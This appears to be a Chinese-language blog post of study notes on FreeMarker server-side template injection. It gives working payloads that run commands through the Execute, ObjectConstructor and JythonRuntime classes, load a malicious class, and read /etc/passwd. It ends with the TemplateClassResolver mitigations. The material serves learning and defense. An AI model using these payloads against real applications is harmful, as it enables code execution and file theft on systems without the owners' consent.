---
title: Freemarker模板注入
date: 2025-10-26 07:26:28
updated: 2025-10-26 08:49:49
tags:
  - Web
  - java
  - 代码审计
---
FreeMarker中有大量的内建函数，其中new函数和api函数可以实现达到命令执行的效果。但对于api函数必须在配置项api\_builtin\_enabled为true时才有效，而该配置在2.3.22版本之后默认为false

学习文章  
[【代码审计】模板注入 | TeamsSix](https://teamssix.com/211203-200441.html#toc-heading-4)

[逃逸安全的模板沙箱（一）——FreeMarker（上）](https://paper.seebug.org/1304/#liferay-freemarkerssti)

# new 内建函数利用

> [https://paper.seebug.org/1304/](https://paper.seebug.org/1304/)
> 
> 主要是寻找实现了 TemplateModel 接口的可利用类来进行实例化。freemarker.template.utility包中存在三个符合条件的类，分别为 Execute类、ObjectConstructor类、 JythonRuntime类。

freemarker.template.utility 类官方文档：[Overview (FreeMarker 2.3.34 API)](https://freemarker.apache.org/docs/api/index.html)

```java
<#assign value="freemarker.template.utility.Execute"?new()>${value("calc.exe")}
<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","calc.exe").start()}
<#assign value="freemarker.template.utility.JythonRuntime"?new()><@value>import os;os.system("calc.exe")</@value>//@value为自定义标签
```

# api 内建函数利用

> [https://paper.seebug.org/1304/](https://paper.seebug.org/1304/)  
> 我们可以通过 api内建函数获取类的 classloader然后加载恶意类，或者通过Class.getResource的返回值来访问 URI对象。 URI对象包含 toURL和 create方法，我们通过这两个方法创建任意 URI，然后用 toURL访问任意URL。

```java
//加载恶意类
<#assign classLoader=object?api.class.getClassLoader()>${classLoader.loadClass("Evil.class")}

//读取任意文件
<#assign uri=object?api.class.getResource("/").toURI()>
  <#assign input=uri?api.create("file:///etc/passwd").toURL().openConnection()>
  <#assign is=input?api.getInputStream()>
  FILE:[<#list 0..999999999 as _>
      <#assign byte=is.read()>
      <#if byte == -1>
          <#break>
      </#if>
  ${byte}, </#list>]
```

# 修复

> 从 2.3.17版本以后，官方版本提供了三种TemplateClassResolver对类进行解析：
> 
> 1、UNRESTRICTED\_RESOLVER：可以通过 ClassUtil.forName(className) 获取任何类。
> 
> 2、SAFER\_RESOLVER：不能加载 freemarker.template.utility.JythonRuntime、freemarker.template.utility.Execute、freemarker.template.utility.ObjectConstructor这三个类。
> 
> 3、ALLOWS\_NOTHING\_RESOLVER：不能解析任何类。
> 
> 可通过 freemarker.core.Configurable#setNewBuiltinClassResolver方法设置TemplateClassResolver，从而限制通过 new()函数对freemarker.template.utility.JythonRuntime、freemarker.template.utility.Execute、freemarker.template.utility.ObjectConstructor这三个类的解析。